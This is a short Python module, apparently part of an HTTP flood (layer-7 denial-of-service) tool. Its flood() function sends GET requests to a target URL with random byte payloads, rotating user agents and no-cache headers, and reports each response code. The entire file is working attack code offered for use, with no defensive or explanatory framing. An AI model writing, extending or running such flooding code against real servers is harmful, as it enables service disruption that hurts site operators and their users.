import json
import random

import requests
from colorama import Fore

from tools.crash import CriticalError

# Loads user agents
with open("tools/L7/user_agents.json", "r") as agents:
    user_agents = json.load(agents)["agents"]

# Headers
headers = {
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Accept-Encoding": "gzip, deflate, br",
    "User-agent": random.choice(user_agents),
}

# Flood function
def flood(target: str) -> None:
    payload = str(random._urandom(random.randint(10, 150)))
    try:
        r = requests.get(target, params=payload, headers=headers, timeout=4)
    except requests.exceptions.ConnectTimeout as err:
        CriticalError("Timed out!", err)
    except requests.exceptions.ConnectionError as err:
        CriticalError("There was a connection error!", err)
    except Exception as err:
        CriticalError("There was an error during the resquests!", err)
    else:
        print(
            f"{Fore.GREEN}[{r.status_code}] {Fore.CYAN}Request sending! Payload Size: {len(payload)}.{Fore.RESET}"
        )
